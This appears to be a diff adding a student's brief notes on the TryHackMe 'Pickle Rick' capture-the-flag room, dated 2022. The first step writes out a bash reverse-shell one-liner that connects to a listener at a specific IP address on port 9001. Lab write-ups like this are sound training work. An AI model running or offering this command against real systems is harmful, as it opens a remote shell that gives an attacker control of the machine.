@@ -1,0 +1,10 @@
+Deven Maheshwari
+Cybersecurity
+Pickle Rick tryhackme
+May 4, 2022
+
+1. bash -c 'bash -i >& /dev/tcp/71.247.212.205/9001 0>&1'
+I also had a listening server open on my attack machine. 
+
+2. Much easier since I had shell access in my own terminal. 
+
